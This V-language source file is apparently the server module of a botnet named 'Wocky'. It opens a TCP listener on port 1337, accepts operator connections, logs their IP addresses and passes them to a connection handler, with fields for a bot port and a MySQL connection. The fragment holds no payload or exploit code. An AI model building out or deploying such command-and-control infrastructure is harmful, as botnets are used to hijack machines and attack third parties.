module wocky

import os
import net
import mysql

import wocky
import config
import utilities
import term_control

pub struct Wocky {
	pub mut:
		client_port		int = 1337
		bot_port		int = 0 
		sqlconn			&mysql.Connection
}

pub fn start_wocky(mut w Wocky) {
	mut server := net.listen_tcp(.ip6, ":${w.client_port}") or {
		println("[x] Error, Unable to start Wocky NET due to no internet connection or used port!")
		exit(0)
	}
	println("${term_control.Green}[${utilities.current_time()}][+]${term_control.Default} Wocky Botnet has started on ${w.client_port}....!")
	w.listener(mut server)
}

pub fn (mut w Wocky) listener(mut server net.TcpListener) {
	for {
		mut socket := server.accept() or {
			panic("[x] Error, Unable to accept client's connection!")
		}
		socket.write_string(term_control.Clear) or { 0 }
		user_addr := socket.peer_addr() or { return } // This should almost never return an err
		user_ip := "${user_addr}".replace("[::ffff:","").split("]:")[0]
		user_port := "${user_addr}".split("]:")[1]
		println("${term_control.Green}[${utilities.current_time()}][+]${term_control.Default} New connection established. IP: ${user_ip}:${user_port}...")
		wocky.connection_handler(mut socket, mut &w)
	}
}